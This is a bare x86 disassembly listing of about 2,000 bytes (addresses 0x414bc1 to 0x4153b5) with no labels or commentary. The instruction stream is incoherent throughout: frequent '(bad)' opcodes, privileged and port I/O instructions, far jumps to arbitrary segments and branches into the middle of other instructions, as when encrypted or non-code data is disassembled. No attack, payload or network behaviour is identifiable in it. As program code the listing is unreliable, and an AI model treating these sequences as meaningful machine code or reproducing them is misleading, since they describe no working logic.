  414bc1:	(bad)
  414bc5:	jge    0x414c04
  414bc7:	(bad)  
  414bc8:	sbb    al,BYTE PTR ds:0x8d6be87
  414bce:	mov    ecx,ecx
  414bd0:	jp     0x414c38
  414bd2:	sahf   
  414bd3:	xchg   edi,eax
  414bd4:	fcos   
  414bd6:	dec    ebx
  414bd7:	je     0x414c3b
  414bd9:	repnz test al,0x12
  414bdc:	leave  
  414bdd:	xchg   DWORD PTR [ebx+0x58],esp
  414be0:	icebp  
  414be1:	pop    ds
  414be2:	repz push esp
  414be4:	and    al,0x9b
  414be6:	imul   esp,DWORD PTR [edi-0x2a],0xf3137f19
  414bed:	rcl    ebp,0xa3
  414bf0:	add    DWORD PTR [ebp-0x5c],esp
  414bf3:	cs jb  0x414b99
  414bf6:	cmp    al,0xbb
  414bf8:	push   ds
  414bf9:	push   esi
  414bfa:	inc    ecx
  414bfb:	or     eax,0x20b989a7
  414c00:	ins    BYTE PTR es:[edi],dx
  414c01:	int    0x2f
  414c03:	pop    esi
  414c04:	js     0x414bc0
  414c06:	aad    0x9e
  414c08:	push   ss
  414c09:	and    bl,BYTE PTR [eax+edi*4+0x3f]
  414c0d:	or     DWORD PTR [esi-0xabd96a3],ebp
  414c13:	enter  0x4664,0x28
  414c17:	cli    
  414c18:	fst    QWORD PTR [edi+0x4883a7c]
  414c1e:	aaa    
  414c1f:	stos   BYTE PTR es:[edi],al
  414c20:	pusha  
  414c21:	inc    edi
  414c22:	mov    ebp,0xab2128d4
  414c27:	sub    eax,DWORD PTR [ebp-0x10615d61]
  414c2d:	cmp    bh,ah
  414c2f:	mov    DWORD PTR [eax+0x6b],ebx
  414c32:	sub    DWORD PTR ds:0x3260f6b7,0x187446bc
  414c3c:	test   DWORD PTR [eax],ebx
  414c3e:	mov    ds:0xdb047472,eax
  414c43:	add    al,0x0
  414c45:	iret   
  414c46:	push   edi
  414c47:	add    dl,BYTE PTR [eax+0x6282aa4b]
  414c4d:	xor    bl,BYTE PTR [edx+0x5c]
  414c50:	adc    BYTE PTR [edi+0x5a9eb112],0x67
  414c57:	mov    bh,0x82
  414c59:	out    dx,al
  414c5a:	lahf   
  414c5b:	and    DWORD PTR [edi],esp
  414c5d:	and    eax,0x8082232
  414c62:	xchg   edi,eax
  414c63:	int3   
  414c64:	(bad)  [ecx-0x1c23e65b]
  414c6a:	ins    DWORD PTR es:[edi],dx
  414c6b:	adc    DWORD PTR [ebp-0x94a6e21],ebp
  414c71:	inc    esp
  414c72:	jmp    0x59e6:0x53209083
  414c79:	sbb    al,0x35
  414c7b:	test   al,0x51
  414c7d:	lods   eax,DWORD PTR ds:[esi]
  414c7e:	in     eax,dx
  414c7f:	stos   DWORD PTR es:[edi],eax
  414c80:	dec    ebx
  414c81:	aaa    
  414c82:	adc    dh,bh
  414c84:	sub    al,0x94
  414c86:	mov    ecx,0x96ff8819
  414c8b:	scas   eax,DWORD PTR es:[edi]
  414c8c:	add    DWORD PTR [ebx-0x5f9e9e6d],ebp
  414c92:	(bad)  
  414c93:	sar    ch,1
  414c95:	mov    al,0xc6
  414c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c98:	add    eax,0x9369c9dd
  414c9d:	cmp    esp,ecx
  414c9f:	xchg   ebx,eax
  414ca0:	hlt    
  414ca1:	dec    eax
  414ca2:	jl     0x414c45
  414ca4:	cmp    ecx,esp
  414ca6:	mov    bh,0x2b
  414ca8:	push   es
  414ca9:	xchg   ecx,eax
  414caa:	adc    al,0xea
  414cac:	add    al,0x16
  414cae:	push   eax
  414caf:	ud0    edi,DWORD PTR [ecx]
  414cb2:	add    BYTE PTR [eax-0x44],cl
  414cb5:	xchg   DWORD PTR [ecx-0x68fbb28e],eax
  414cbb:	cmp    ch,ah
  414cbd:	mov    bl,0xe
  414cbf:	adc    dh,bl
  414cc1:	xor    cl,BYTE PTR [ecx]
  414cc3:	es sahf 
  414cc5:	or     BYTE PTR [ebp+ebx*8-0x22],cl
  414cc9:	ins    DWORD PTR es:[edi],dx
  414cca:	mov    eax,0x3ff0c591
  414ccf:	je     0x414c7f
  414cd1:	fsubr  DWORD PTR [edx+eiz*8]
  414cd4:	push   0xe1da84ba
  414cd9:	cmp    al,0x52
  414cdb:	cmc    
  414cdc:	jmp    0x414d1d
  414cde:	imul   ebp,DWORD PTR [edi-0x6],0x1d
  414ce2:	dec    ecx
  414ce3:	or     cl,ah
  414ce5:	inc    esp
  414ce6:	mov    edi,0x51afece8
  414ceb:	hlt    
  414cec:	and    BYTE PTR [edi],dl
  414cee:	inc    edi
  414cef:	jb     0x414c95
  414cf1:	mov    esp,0x66c3aa0
  414cf7:	add    al,ah
  414cf9:	ds scas eax,DWORD PTR es:[edi]
  414cfb:	adc    bl,BYTE PTR [edx-0x41]
  414cfe:	addr16 and eax,0x4ac0a18c
  414d04:	jne    0x414d7f
  414d06:	push   ecx
  414d07:	pop    ss
  414d08:	fwait
  414d09:	xor    al,0xb3
  414d0b:	cmp    bl,BYTE PTR [ebx-0x3d1c5423]
  414d11:	aaa    
  414d12:	sub    DWORD PTR [ebp-0x55],edx
  414d15:	icebp  
  414d16:	fcom   QWORD PTR [edx-0x3cb993ea]
  414d1c:	or     DWORD PTR [ebx],0x34
  414d1f:	xor    DWORD PTR [esi],edx
  414d21:	and    eax,0xffffff9c
  414d24:	repz fidiv WORD PTR [ebp+eiz*1+0x4b014437]
  414d2c:	jg     0x414d69
  414d2e:	(bad)  
  414d2f:	popa   
  414d30:	lahf   
  414d31:	jb     0x414d68
  414d33:	and    BYTE PTR ds:0x39b9d7b6,dl
  414d39:	punpckhdq mm2,mm1
  414d3c:	pop    ds
  414d3d:	retf   
  414d3e:	and    DWORD PTR [edi+0x3b],esi
  414d41:	sub    bh,dl
  414d43:	and    BYTE PTR [eax-0x68330d15],0x8b
  414d4a:	leave  
  414d4b:	ficom  DWORD PTR [ecx+0x507494ee]
  414d51:	sbb    ebp,DWORD PTR [ebp-0x36b384f1]
  414d57:	adc    al,0xa6
  414d59:	repz add bl,cl
  414d5c:	in     eax,dx
  414d5d:	push   ds
  414d5e:	or     esp,esp
  414d60:	xchg   edx,eax
  414d61:	add    DWORD PTR [eax+0x2cb3ca48],edi
  414d67:	lock mov ch,BYTE PTR [edx-0x49]
  414d6b:	ds lock ror ebx,1
  414d6f:	cmp    BYTE PTR [edi-0x60df5830],0xb6
  414d76:	aam    0xc7
  414d78:	ss in  al,dx
  414d7a:	aam    0xfc
  414d7c:	push   0xc8ef6264
  414d81:	inc    edi
  414d82:	(bad)  
  414d83:	xor    eax,0xcfae813b
  414d88:	cmp    eax,DWORD PTR [ebp+0x5b]
  414d8b:	push   edx
  414d8c:	(bad)  
  414d8d:	mov    ds:0xc4f5bfc0,al
  414d92:	sbb    bl,BYTE PTR [edx-0x7dd48972]
  414d98:	mov    ch,0xf
  414d9a:	mov    ah,0xa6
  414d9c:	xchg   ebp,eax
  414d9d:	xlat   BYTE PTR ds:[ebx]
  414d9e:	pop    ebp
  414d9f:	les    edi,FWORD PTR ds:0x10fe49e7
  414da5:	idiv   DWORD PTR [ecx-0x39767711]
  414dab:	mov    ecx,0x16b4b0e2
  414db0:	mov    bl,0x52
  414db2:	test   DWORD PTR [ebp-0x1d],edi
  414db5:	push   edx
  414db6:	or     bh,dh
  414db8:	scas   eax,DWORD PTR es:[edi]
  414db9:	dec    edi
  414dba:	cmp    DWORD PTR [eax+ebx*4],edx
  414dbd:	add    edx,esi
  414dbf:	inc    ebx
  414dc0:	ror    DWORD PTR [edx+eax*4],cl
  414dc3:	retf   0xdf46
  414dc6:	jp     0x414e3c
  414dc8:	sbb    cl,BYTE PTR [bx+di+0x3c04]
  414dcd:	ja     0x414d7d
  414dcf:	pushf  
  414dd0:	sub    eax,0x898c41dd
  414dd5:	jne    0x414d69
  414dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd8:	ss pop ecx
  414dda:	or     BYTE PTR [edi+0x76ca099d],bl
  414de0:	mov    dl,0x18
  414de2:	scas   al,BYTE PTR es:[edi]
  414de3:	add    eax,0x76f3c68
  414de8:	mul    BYTE PTR [ecx]
  414dea:	jnp    0x414ddb
  414dec:	repz (bad) 
  414dee:	ror    BYTE PTR [ebx-0x16],cl
  414df1:	adc    BYTE PTR [ebp-0x72],bl
  414df4:	or     bh,al
  414df6:	lods   al,BYTE PTR ds:[esi]
  414df7:	retf   
  414df8:	ja     0x414e73
  414dfa:	push   ecx
  414dfb:	jp     0x414e27
  414dfd:	cmp    ecx,DWORD PTR [ebx+0x2b]
  414e00:	sbb    eax,DWORD PTR [edi]
  414e02:	xor    al,0x7d
  414e04:	std    
  414e05:	or     DWORD PTR [ecx+eiz*1],ebx
  414e08:	cwde   
  414e09:	mov    ds:0x560680a4,al
  414e0e:	mov    eax,0xf8845043
  414e13:	test   eax,0x46fca06b
  414e18:	xchg   edx,eax
  414e19:	enter  0xadde,0x1
  414e1d:	pop    ss
  414e1e:	and    esi,esi
  414e20:	inc    esp
  414e21:	jmp    0x4af5be5a
  414e26:	loop   0x414e70
  414e28:	pcmpeqd mm5,QWORD PTR [edx]
  414e2b:	or     DWORD PTR [eax+0x5],0xffffffb8
  414e2f:	xor    eax,0x600d92e5
  414e34:	mov    cl,0xad
  414e36:	outs   dx,BYTE PTR ds:[esi]
  414e37:	add    BYTE PTR [ebx],dh
  414e39:	stos   BYTE PTR es:[edi],al
  414e3a:	inc    ebp
  414e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e3c:	scas   eax,DWORD PTR es:[edi]
  414e3d:	jmp    0x4379:0x7ec80557
  414e44:	jecxz  0x414de3
  414e46:	mov    ah,0xbe
  414e48:	xchg   ecx,esi
  414e4a:	jmp    0x5a91c8f7
  414e4f:	or     eax,0xc413137
  414e54:	mov    bl,0xeb
  414e56:	sub    eax,0x633578be
  414e5b:	add    eax,0x25bb97bd
  414e60:	and    ebx,DWORD PTR [eax-0x67]
  414e63:	jmp    0x12ec068a
  414e68:	push   cs
  414e69:	repz (bad) 
  414e6b:	sub    ebx,edx
  414e6d:	push   ecx
  414e6e:	add    eax,0x34c621cd
  414e73:	mov    DWORD PTR [edx+0x5e5de743],ecx
  414e79:	pop    ecx
  414e7a:	arpl   bx,di
  414e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e7d:	int3   
  414e7e:	std    
  414e7f:	xor    BYTE PTR [ecx-0x58dc60ed],bl
  414e85:	ret    0x6875
  414e88:	cmp    DWORD PTR [ebp-0x4a67534b],esi
  414e8e:	inc    BYTE PTR [ecx]
  414e90:	push   ds
  414e91:	sub    DWORD PTR gs:[ecx-0x1700ee42],esp
  414e98:	push   ecx
  414e99:	push   ds
  414e9a:	ror    edx,cl
  414e9c:	mov    edi,0x2831f495
  414ea1:	adc    BYTE PTR [ecx+ecx*8-0x12],bl
  414ea5:	outs   dx,DWORD PTR ds:[si]
  414ea7:	sar    DWORD PTR ds:0x16058568,0x13
  414eae:	or     eax,0x6eb1dc78
  414eb3:	cmp    DWORD PTR [edx+edi*8],ebp
  414eb6:	inc    esi
  414eb7:	lahf   
  414eb8:	sbb    dl,BYTE PTR [edx+edx*4-0x35]
  414ebc:	repz adc eax,0x62261139
  414ec2:	addr16 mov ah,0x8b
  414ec5:	(bad)  
  414ec6:	sbb    ecx,ebp
  414ec8:	ins    BYTE PTR es:[edi],dx
  414ec9:	jb     0x414e79
  414ecb:	mov    edx,0xe0a3195
  414ed0:	int    0xbf
  414ed2:	sbb    edx,DWORD PTR [esi-0x33]
  414ed5:	mov    ecx,0xe79930d6
  414eda:	and    DWORD PTR [edi-0x1d],eax
  414edd:	adc    al,0x4
  414edf:	repnz test DWORD PTR [edx+ebx*8],edi
  414ee3:	and    al,0x4a
  414ee5:	in     al,0x18
  414ee7:	xchg   BYTE PTR [edx+esi*2+0x49],ch
  414eeb:	mov    al,ds:0x60670581
  414ef0:	fdivr  QWORD PTR fs:[ebp-0x7c]
  414ef4:	retf   0x4250
  414ef7:	test   BYTE PTR [ecx],bh
  414ef9:	xchg   ebx,eax
  414efa:	scas   al,BYTE PTR es:[edi]
  414efb:	xchg   esi,eax
  414efc:	ins    BYTE PTR es:[edi],dx
  414efd:	jge    0x414f55
  414eff:	ins    DWORD PTR es:[edi],dx
  414f00:	bound  esi,QWORD PTR [esi]
  414f02:	inc    ecx
  414f03:	(bad)  
  414f04:	mov    cs,WORD PTR [edi+0x345de49]
  414f0a:	mov    edx,0x1337a940
  414f0f:	jg     0x414f26
  414f11:	lods   eax,DWORD PTR ds:[esi]
  414f12:	pop    esi
  414f13:	xchg   ebp,eax
  414f14:	and    eax,0x1d6e7ce5
  414f19:	retf   
  414f1a:	inc    edi
  414f1b:	cmc    
  414f1c:	xchg   DWORD PTR [ebx],esi
  414f1e:	cdq    
  414f1f:	or     edi,edx
  414f21:	jg     0x414f09
  414f23:	pusha  
  414f24:	rol    al,cl
  414f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f27:	fbld   TBYTE PTR [ebx-0x7150b0b7]
  414f2d:	inc    esi
  414f2e:	cmp    bh,al
  414f30:	and    al,0xaf
  414f32:	aas    
  414f33:	dec    ecx
  414f34:	cmp    ah,dh
  414f36:	int3   
  414f37:	mov    ecx,0xe68b2337
  414f3c:	(bad)  
  414f3d:	pop    eax
  414f3e:	sbb    dl,cl
  414f40:	pop    esp
  414f41:	lock cmp eax,0x84c56db2
  414f47:	shl    BYTE PTR [ecx-0x2299c19a],cl
  414f4d:	jmp    0x585f:0x2ba1c0dd
  414f54:	jmp    0x414f25
  414f56:	sbb    al,0xcc
  414f58:	inc    DWORD PTR [edx]
  414f5a:	ja     0x414fd2
  414f5c:	or     DWORD PTR [ecx],eax
  414f5e:	sbb    BYTE PTR [eax-0x6f],dh
  414f61:	js     0x414fa5
  414f63:	or     eax,0x9f3e8ebd
  414f68:	push   esp
  414f69:	and    DWORD PTR [ebp-0x49],ecx
  414f6c:	jbe    0x414f83
  414f6e:	sub    al,0xce
  414f70:	sahf   
  414f71:	xor    eax,0x5bb694cb
  414f76:	pusha  
  414f77:	cmp    eax,0x27654ca5
  414f7c:	and    al,ch
  414f7e:	sub    eax,0x7136e2df
  414f83:	in     eax,dx
  414f84:	jge    0x414fd7
  414f86:	leave  
  414f87:	mov    edi,0x52d53633
  414f8c:	sbb    al,0x5f
  414f8e:	lods   eax,DWORD PTR ds:[esi]
  414f8f:	xchg   DWORD PTR [ecx+0x7d0cc73b],ecx
  414f95:	dec    ebp
  414f96:	jp     0x414fc3
  414f98:	push   DWORD PTR [esp+edx*2]
  414f9b:	gs mov ecx,0xc9f453f
  414fa1:	dec    esi
  414fa2:	mov    ecx,0xa48362f2
  414fa7:	loop   0x414f47
  414fa9:	rol    DWORD PTR [ebp-0x1b8265c9],1
  414faf:	sbb    al,0x67
  414fb1:	test   BYTE PTR [ebx-0x6dbd22fd],ch
  414fb7:	adc    bh,BYTE PTR [edx+0x64bd09f0]
  414fbd:	sar    BYTE PTR [esi-0x5220fd26],cl
  414fc3:	sti    
  414fc4:	fnstsw WORD PTR [eax+eax*4]
  414fc7:	div    DWORD PTR [ecx+ebx*4-0x20]
  414fcb:	mov    dl,0xf5
  414fcd:	dec    esp
  414fce:	cmc    
  414fcf:	mov    dh,0x71
  414fd1:	mov    BYTE PTR [eax+0x54],dh
  414fd4:	mov    dh,0xef
  414fd6:	shr    DWORD PTR [esp+ebp*2],1
  414fd9:	je     0x41500d
  414fdb:	ds mov ah,dh
  414fde:	cmp    DWORD PTR [eax],esp
  414fe0:	add    cl,BYTE PTR [ebp-0x2]
  414fe3:	cmp    al,0x43
  414fe5:	jo     0x414fdd
  414fe7:	adc    eax,0xef07db78
  414fec:	mov    al,ds:0x595de0b8
  414ff1:	outs   dx,BYTE PTR ds:[esi]
  414ff2:	jp     0x41506c
  414ff4:	and    esp,DWORD PTR [edx]
  414ff6:	dec    edi
  414ff7:	cld    
  414ff8:	xchg   DWORD PTR [esi],ebx
  414ffa:	mov    ebx,DWORD PTR [esi]
  414ffc:	jae    0x414fd3
  414ffe:	(bad)  
  414fff:	hlt    
  415000:	out    0x33,al
  415002:	jno    0x414f94
  415004:	cmp    DWORD PTR [edx],0x81e64a64
  41500a:	jp     0x415031
  41500c:	mov    ebx,DWORD PTR [ebp-0x70841520]
  415012:	in     al,dx
  415013:	pushf  
  415014:	out    0x76,al
  415016:	jge    0x415071
  415018:	loop   0x415035
  41501a:	cmp    eax,0x579c0fd4
  41501f:	(bad)  
  415020:	xor    eax,0x1c9b81b7
  415025:	js     0x41502f
  415027:	jmp    0xd85da14d
  41502c:	test   al,0x4e
  41502e:	test   eax,0x3c245881
  415033:	mov    dl,0xee
  415035:	sub    eax,edi
  415037:	pop    es
  415038:	mov    al,ds:0xa6d27df8
  41503d:	and    eax,0x9a50c55e
  415042:	repz jl 0x414ff9
  415045:	call   0x4ebb:0x87d7029a
  41504c:	fs aam 0x28
  41504f:	(bad)  
  415050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415051:	mov    ds:0x183e657e,eax
  415056:	lahf   
  415057:	fcom   QWORD PTR [eax-0x58]
  41505a:	and    al,0x7d
  41505c:	xchg   esp,eax
  41505d:	lods   eax,DWORD PTR gs:[esi]
  41505f:	arpl   WORD PTR [edi+ebp*4+0x4a],si
  415063:	mov    al,0x6
  415065:	jb     0x415068
  415067:	out    dx,al
  415068:	into   
  415069:	out    dx,eax
  41506a:	and    BYTE PTR [ebp-0xc],0x15
  41506e:	imul   edi,DWORD PTR [edx+0x0],0xe5c777ac
  415075:	or     ebp,DWORD PTR [ebp-0x13b9c93a]
  41507b:	sub    bl,BYTE PTR [edx+0x5e]
  41507e:	lahf   
  41507f:	aad    0xaf
  415081:	sub    ebx,DWORD PTR [edi]
  415083:	add    edi,DWORD PTR [edx+0x16]
  415086:	les    ebx,FWORD PTR [edx]
  415088:	dec    esi
  415089:	arpl   dx,cx
  41508b:	aaa    
  41508c:	push   esp
  41508d:	popa   
  41508e:	je     0x41509f
  415090:	xor    ch,BYTE PTR [esi+0x0]
  415093:	mov    ch,0xe0
  415095:	xchg   edx,eax
  415096:	add    al,0xa6
  415098:	ffree  st(0)
  41509a:	xchg   ecx,eax
  41509b:	setbe  BYTE PTR [ecx]
  41509e:	ret    
  41509f:	aam    0x91
  4150a1:	test   eax,0x35c4da7c
  4150a6:	jmp    0x657a5184
  4150ab:	xchg   esp,eax
  4150ac:	adc    eax,0xf7c28104
  4150b1:	add    DWORD PTR [ebx-0x6347377d],edx
  4150b7:	call   ecx
  4150b9:	adc    bh,ch
  4150bb:	aas    
  4150bc:	push   es
  4150bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150be:	gs inc eax
  4150c0:	pop    ebx
  4150c1:	aad    0x9e
  4150c3:	imul   eax,DWORD PTR [eax-0x1f18e488],0xb276902
  4150cd:	fisttp DWORD PTR [ecx+ebx*2+0x6d]
  4150d1:	mov    eax,0x9c52f4a7
  4150d6:	stos   BYTE PTR es:[edi],al
  4150d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150d8:	daa    
  4150d9:	sahf   
  4150da:	xchg   ecx,eax
  4150db:	or     ebx,DWORD PTR [edx-0x20]
  4150de:	or     BYTE PTR [ebp+0x1ef78637],dh
  4150e4:	fisubr DWORD PTR [ebx+0x43]
  4150e7:	ret    0x21b3
  4150ea:	es mov ?,eax
  4150ed:	or     ebp,DWORD PTR [ebx+0x6bad5b6e]
  4150f3:	jbe    0x41511a
  4150f5:	cmc    
  4150f6:	sub    BYTE PTR [eax+ebx*8],bl
  4150f9:	rcr    DWORD PTR [edx+0x4f],1
  4150fc:	ret    
  4150fd:	cwde   
  4150fe:	jg     0x415121
  415100:	and    dl,BYTE PTR [ebx+0x1784e645]
  415106:	scas   eax,DWORD PTR es:[edi]
  415107:	loop   0x415101
  415109:	push   esp
  41510a:	mov    edi,0x2ef4d0d2
  41510f:	xor    bh,bh
  415111:	(bad)  
  415112:	mov    eax,ds:0x6d0b1975
  415117:	sahf   
  415118:	xchg   ecx,eax
  415119:	add    BYTE PTR [eax+ecx*1-0x64333795],dl
  415120:	in     al,0xc3
  415122:	mov    dh,0x33
  415124:	adc    cl,BYTE PTR [eax+0x79]
  415127:	fbstp  TBYTE PTR [esi+0xbab4fed]
  41512d:	xchg   DWORD PTR [esi-0x573ef598],ebp
  415133:	mov    edi,0xb986e49d
  415138:	das    
  415139:	jb     0x4150cf
  41513b:	jnp    0x415178
  41513d:	push   esp
  41513e:	ja     0x415156
  415140:	out    dx,al
  415141:	arpl   dx,bx
  415143:	(bad)  
  415144:	jge    0x41519a
  415146:	dec    esp
  415147:	adc    ch,ch
  415149:	cmp    DWORD PTR [edx-0x61],eax
  41514c:	xor    eax,0x34e090bf
  415151:	arpl   WORD PTR [edx],si
  415153:	outs   dx,DWORD PTR ds:[esi]
  415154:	dec    esi
  415155:	mov    bh,0xf9
  415157:	imul   esp,DWORD PTR [edi+0x2d99f202],0xb
  41515e:	pop    esi
  41515f:	(bad)  
  415161:	fwait
  415162:	or     ah,ah
  415164:	inc    ebp
  415165:	xor    eax,0xc40053b8
  41516a:	dec    eax
  41516b:	leave  
  41516c:	dec    edx
  41516d:	and    DWORD PTR [esi-0x4f],0xffffffa4
  415171:	outs   dx,BYTE PTR ds:[esi]
  415172:	pop    esp
  415173:	mov    edi,DWORD PTR [ebp-0x35]
  415176:	add    eax,0x96758c24
  41517b:	and    eax,0x453c1647
  415180:	loope  0x415106
  415182:	test   al,0xdb
  415184:	popf   
  415185:	add    eax,0x195c7633
  41518a:	ins    BYTE PTR es:[edi],dx
  41518b:	outs   dx,DWORD PTR ds:[esi]
  41518c:	mov    edi,0x83680899
  415191:	adc    al,0x4c
  415193:	jo     0x415190
  415195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415196:	cld    
  415197:	xchg   ecx,eax
  415198:	cli    
  415199:	push   edx
  41519a:	jp     0x4151f7
  41519c:	push   0x190f146a
  4151a1:	add    eax,0x18d58424
  4151a6:	add    DWORD PTR [eax],ecx
  4151a8:	and    esp,DWORD PTR [ebp-0x702d9dc6]
  4151ae:	jnp    0x415137
  4151b0:	mov    dl,BYTE PTR [edx+0x59]
  4151b3:	inc    esi
  4151b4:	push   esi
  4151b5:	sbb    esi,DWORD PTR [esp+ecx*1]
  4151b8:	mov    ah,bh
  4151ba:	shr    edi,cl
  4151bc:	pop    esp
  4151bd:	dec    ebx
  4151be:	pop    ecx
  4151bf:	call   0x4d6d6498
  4151c4:	mul    BYTE PTR [eax]
  4151c6:	add    eax,0x60961619
  4151cb:	pusha  
  4151cc:	mov    BYTE PTR [ecx],cl
  4151ce:	in     al,0xb7
  4151d0:	out    0xca,eax
  4151d2:	sti    
  4151d3:	or     eax,DWORD PTR [ebx-0x1858169c]
  4151d9:	cmc    
  4151da:	icebp  
  4151db:	cmp    ebp,DWORD PTR [eax]
  4151dd:	add    eax,0xcc264d57
  4151e2:	xlat   BYTE PTR ds:[ebx]
  4151e3:	mov    ecx,0x8a2cdeb7
  4151e8:	loop   0x4151fa
  4151ea:	mov    esp,0x23cfe9d5
  4151ef:	arpl   WORD PTR [ebx],ax
  4151f1:	add    DWORD PTR [eax-0x5698ff],0xffffffb4
  4151f8:	jl     0x4151e3
  4151fa:	cdq    
  4151fb:	stos   BYTE PTR es:[edi],al
  4151fc:	pusha  
  4151fd:	cmp    BYTE PTR [eax+0x4127608a],0x9b
  415204:	mov    cl,0xa6
  415206:	push   ecx
  415207:	test   eax,0x14087604
  41520c:	mov    eax,0xede04e19
  415211:	es inc esp
  415213:	cmp    DWORD PTR [edx-0x64],edi
  415216:	jne    0x41519e
  415218:	jbe    0x415278
  41521a:	cli    
  41521b:	sub    BYTE PTR [ecx],bl
  41521d:	imul   ebx,DWORD PTR [ebx],0x6effdde3
  415223:	inc    ebx
  415224:	fwait
  415225:	jnp    0x415249
  415227:	cmp    eax,0x17ba9535
  41522c:	mov    eax,ds:0x292496d
  415231:	arpl   WORD PTR [edx-0x4ebb0993],bx
  415237:	mov    ch,0xa1
  415239:	adc    eax,0x41b15906
  41523e:	mov    ch,dh
  415240:	lock inc edx
  415242:	lods   eax,DWORD PTR ds:[esi]
  415243:	ss fcmovnu st,st(7)
  415246:	mov    fs,edx
  415248:	jge    0x4152ac
  41524a:	fnstsw WORD PTR [edi-0x29]
  41524d:	inc    DWORD PTR [edx+0x3]
  415250:	shl    DWORD PTR [ebp-0x33],cl
  415253:	cmp    eax,0xcfce3195
  415258:	push   eax
  415259:	and    ch,BYTE PTR [esi-0x13]
  41525c:	test   edi,esp
  41525e:	pop    edx
  41525f:	sub    cl,dh
  415261:	arpl   WORD PTR [ecx+0x61219926],di
  415267:	test   eax,0x88131b3b
  41526c:	cld    
  41526d:	sbb    ebx,DWORD PTR ds:0x7f5abd88
  415273:	jno    0x415242
  415275:	pop    ebp
  415276:	xor    bl,BYTE PTR [eax+0x30a9ade2]
  41527c:	aas    
  41527d:	sub    DWORD PTR [ecx-0x16bf0ed9],ecx
  415283:	cmc    
  415284:	js     0x41522d
  415286:	sti    
  415287:	mov    eax,ds:0x33a04b03
  41528c:	or     ch,BYTE PTR [edi-0x5496e1f6]
  415292:	in     al,0xa7
  415294:	inc    ebp
  415295:	jl     0x4152b5
  415297:	mov    eax,0xcd60b4ac
  41529c:	xor    bl,BYTE PTR [ecx+0x25c96d49]
  4152a2:	in     eax,0x1e
  4152a4:	(bad)  
  4152a5:	cs cmp ch,cl
  4152a8:	push   ds
  4152a9:	mov    ds:0xa0a6351d,al
  4152ae:	or     esp,DWORD PTR [edi-0x68d97a79]
  4152b4:	add    DWORD PTR [ecx+0x3],eax
  4152b7:	sbb    ch,bh
  4152b9:	aaa    
  4152ba:	jae    0x41532d
  4152bc:	and    al,0x27
  4152be:	out    0x3a,al
  4152c0:	mov    esp,0x7545be48
  4152c5:	inc    ebp
  4152c6:	add    BYTE PTR [ecx+0x5f],bl
  4152c9:	sbb    eax,0xae6d9d4b
  4152ce:	cmp    eax,0xabf29e9e
  4152d3:	imul   ebp,DWORD PTR [eax-0x1752ce3],0xfffffff6
  4152da:	push   cs
  4152db:	adc    al,BYTE PTR [ebx+0x33260eef]
  4152e1:	dec    ecx
  4152e2:	xbegin 0x8dbf181e
  4152e8:	(bad)  
  4152e9:	xor    ecx,edx
  4152eb:	rol    al,1
  4152ed:	sbb    bh,BYTE PTR [ebx]
  4152ef:	sahf   
  4152f0:	(bad)  
  4152f1:	push   cs
  4152f2:	out    dx,eax
  4152f3:	add    DWORD PTR [ecx],esp
  4152f5:	aad    0xde
  4152f7:	lock das 
  4152f9:	int    0x42
  4152fb:	inc    ebx
  4152fc:	nop
  4152fd:	repz fstp QWORD PTR [ebp+0x38bb7c90]
  415304:	xchg   esp,eax
  415305:	and    DWORD PTR [ecx-0x47d51639],ebp
  41530b:	repz rcr al,cl
  41530e:	test   al,0xe8
  415310:	popa   
  415311:	adc    cl,BYTE PTR [ecx+esi*8]
  415314:	inc    eax
  415315:	or     edi,DWORD PTR [ecx-0x72]
  415318:	sub    DWORD PTR [edi+0x5d080445],edi
  41531e:	jae    0x4152ae
  415320:	jle    0x4152b8
  415322:	popf   
  415323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415324:	dec    ecx
  415325:	sbb    BYTE PTR [edi+0x17bbefed],bh
  41532b:	dec    eax
  41532c:	fdivr  DWORD PTR [ecx+0x43]
  41532f:	xchg   esp,eax
  415330:	mov    ecx,0xc74b9e21
  415335:	pop    ebp
  415336:	xor    DWORD PTR [ebx+eiz*4-0x276d47a8],ebp
  41533d:	aaa    
  41533e:	aam    0x96
  415340:	mov    eax,?
  415342:	mov    edi,0xb69600f8
  415347:	cmp    esp,DWORD PTR [ecx+0x10]
  41534a:	sub    BYTE PTR ds:0xc59ca0cd,bh
  415350:	sbb    cl,BYTE PTR [ebx]
  415352:	das    
  415353:	xchg   edi,esi
  415355:	or     dl,BYTE PTR ds:0xdb3106ca
  41535b:	cmp    BYTE PTR [ecx-0x3e],0xe4
  41535f:	push   ecx
  415360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415361:	inc    esp
  415362:	out    0x76,eax
  415364:	mov    dl,0x3e
  415366:	cwde   
  415367:	lds    esp,FWORD PTR ds:0xa1a6b017
  41536d:	mov    ch,0x70
  41536f:	pusha  
  415370:	rcr    al,cl
  415372:	lea    eax,[edi+0x37]
  415375:	adc    al,0xa6
  415377:	xor    eax,DWORD PTR [edx-0x28]
  41537a:	stos   BYTE PTR es:[edi],al
  41537b:	cmp    BYTE PTR [eax+0x71],dl
  41537e:	xchg   esp,eax
  41537f:	pop    edx
  415380:	jecxz  0x41531a
  415382:	stos   DWORD PTR es:[edi],eax
  415383:	inc    esi
  415384:	ja     0x4153e7
  415386:	dec    esp
  415387:	cli    
  415388:	jno    0x415406
  41538a:	cmp    DWORD PTR [ebp+0x1c4da5ec],ebx
  415390:	je     0x4153d4
  415392:	shl    DWORD PTR [edi+edx*8+0xc],0x0
  415397:	lds    ebx,FWORD PTR ds:0x237354e8
  41539d:	cwde   
  41539e:	adc    BYTE PTR [ebx-0x21],dh
  4153a1:	ds push 0xffffffe6
  4153a4:	dec    ebx
  4153a5:	xor    bl,BYTE PTR [edi+0x63]
  4153a8:	push   ecx
  4153a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153aa:	add    edi,DWORD PTR [esi]
  4153ac:	xchg   esi,eax
  4153ad:	jae    0x415339
  4153af:	or     esp,DWORD PTR ds:0xf2b14cf4
  4153b5:	(bad)  
